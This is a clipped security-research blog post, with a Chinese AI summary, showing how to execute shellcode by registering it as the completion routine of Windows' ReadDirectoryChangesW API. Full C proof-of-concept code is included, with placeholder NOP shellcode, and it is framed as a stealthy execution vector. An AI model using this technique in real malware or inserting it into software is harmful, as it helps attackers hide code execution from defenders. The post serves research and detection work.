---
title: Executing Shellcode with ReadDirectoryChanges’s Hidden Callback
source: https://osandamalith.com/2025/09/25/executing-shellcode-with-readdirectorychangess-hidden-callback/?utm_source=rss&utm_medium=rss&utm_campaign=executing-shellcode-with-readdirectorychangess-hidden-callback
source_host: osandamalith.com
clip_date: 2026-10-26T10:22:52+08:00
trace_id: 87ca9a69-918c-46cf-b56d-b4593dc591c0
content_hash: 88c2193c3cbba5a1c8b0e692d76496d7edb2627fcdd4e922e8c786bc2067a415
status: synced
tags:
  - Windows逆向
  - Shellcode
series: null
feed_source: Osanda·逆向/安全研究
ai_summary: "**TL;DR：** 把 `ReadDirectoryChangesW` 的异步完成回调参数换成 shellcode 地址，可将普通文件监控 API 变成隐蔽的代码执行载体。"
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 40575244-d011-8175-bbd5-db605906f8b5
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> **TL;DR：** 把 `ReadDirectoryChangesW` 的异步完成回调参数换成 shellcode 地址，可将普通文件监控 API 变成隐蔽的代码执行载体。
> 
> - **利用点：** `ReadDirectoryChangesW` 最后一个参数 `LPOVERLAPPED_COMPLETION_ROUTINE` 支持异步回调，PoC 直接将 shellcode 地址强转后作为完成例程传入，而非注册正常的监控回调。
> - **触发链：** 被监控目录中发生文件创建/删除/重命名并完成异步 I/O 后，Windows 内核向发起线程排入一个用户态 APC；主线程通过 `SleepEx(100, TRUE)` 进入可警醒（alertable）状态，APC 随即被投递，shellcode 作为 I/O 完成例程在主线程上下文中直接执行。
> - **实现细节：** shellcode 以 `__declspec(allocate(".text"))` 内嵌于可执行文件的 .text 节；目录句柄先用 `CreateFileW` 以 `FILE_LIST_DIRECTORY` 权限及 `FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED` 标志打开。
> - **触发条件：** 需同时满足两点——已向目录注册 shellcode 为完成例程，且线程处于 alertable 等待；PoC 通过无限循环调用 `SleepEx` 持续等待，返回 `WAIT_IO_COMPLETION` 即表示回调已执行。
> - **隐蔽价值：** 该 API 平时仅用于监控文件系统变化，劫持其回调可让执行路径隐藏在常规文件监控行为之后；PoC 由 Osanda Malith Jayathissa 于 2025-09-25 发布并附完整源码。

While digging into the `ReadDirectoryChanges` API, I noticed it supports an asynchronous callback via `LPOVERLAPPED_COMPLETION_ROUTINE`. Most people use this API to monitor file system changes, but what if we could hijack that callback to execute shellcode? This led me to develop a proof-of-concept (PoC) that turns a mundane filesystem monitoring function into a stealthy shellcode execution vector.

## API 签名

The API is documented as follows by Microsoft.

```css
BOOL ReadDirectoryChangesW(
  [in]                HANDLE                          hDirectory,
  [out]               LPVOID                          lpBuffer,
  [in]                DWORD                           nBufferLength,
  [in]                BOOL                            bWatchSubtree,
  [in]                DWORD                           dwNotifyFilter,
  [out, optional]     LPDWORD                         lpBytesReturned,
  [in, out, optional] LPOVERLAPPED                    lpOverlapped,
  [in, optional]      LPOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
);
```

## PoC 实现与执行原理

In this PoC, the shellcode is embedded in the executable’s.text section and passed as the `lpCompletionRoutine` argument to `ReadDirectoryChanges`. When a file system event like creating/deleting/renaming a file in a given directory completes the asynchronous I/O operation, the Windows kernel queues a user-mode Asynchronous Procedure Call (APC) to the issuing thread. Since the main thread enters an alertable state via `SleepEx(100, TRUE)`, the kernel delivers the APC, which invokes the shellcode as the I/O completion routine. This executes the shellcode directly in the context of the program’s main thread.

```cpp
#include 
#include 
/*
[*] ReadDirectoryChanges Shellcode Execution PoC
[*] Author: Osanda Malith Jayathissa - @OsandaMalith
[*] www.osandamalith.com
[*] Date: 25/09/2025
*/
#pragma section(".text")
__declspec(allocate(".text")) unsigned char shellcode[] = {
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90
};

int main() {
    puts("[*] ReadDirectoryChanges Shellcode Execution PoC");
    puts("[*] Author: Osanda Malith Jayathissa - @OsandaMalith");
    puts("[*] www.osandamalith.com\n");

    LPCWSTR dirPath = L"C:\\Temp"; // Dir to monitor
    HANDLE hDir = CreateFileW(
        dirPath,
        FILE_LIST_DIRECTORY,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED,
        NULL
    );
    if (hDir == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open directory: %d\n", GetLastError());
        return 1;
    }
    printf("[+] Monitoring directory: %ls\n", dirPath);
    printf("[+] Shellcode at: 0x%p\n", shellcode);

    BYTE buffer[1024];
    OVERLAPPED overlapped = { 0 };
    overlapped.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

    BOOL result = ReadDirectoryChangesW(
        hDir,
        buffer,
        sizeof buffer,
        TRUE,
        FILE_NOTIFY_CHANGE_FILE_NAME | FILE_NOTIFY_CHANGE_DIR_NAME,
        NULL,
        &overlapped,
        (LPOVERLAPPED_COMPLETION_ROUTINE)(PVOID)shellcode    // Register shellcode as completion routine
    );
    if (!result) {
        printf("[-] ReadDirectoryChanges failed: %d\n", GetLastError());
        CloseHandle(overlapped.hEvent);
        CloseHandle(hDir);
        return 1;
    }
    printf("[+] Shellcode registered as completion routine!\n");
    printf("\n[*] To trigger shellcode:\n");
    printf("[+] Create/delete/rename a file in: %ls\n", dirPath);

    // Wait for events
    while (TRUE) {
        // SleepEx with alertable wait
        DWORD waitResult = SleepEx(100, TRUE);  // TRUE = alertable 
        if (waitResult == WAIT_IO_COMPLETION) {
            printf("[!] Completion routine executed!\n");
        }
    }

    CloseHandle(overlapped.hEvent);
    CloseHandle(hDir);
    return 0;
}
```

[https://github.com/OsandaMalith/CallbackShellcode/blob/main/ReadDirectoryChanges.c](https://github.com/OsandaMalith/CallbackShellcode/blob/main/ReadDirectoryChanges.c)
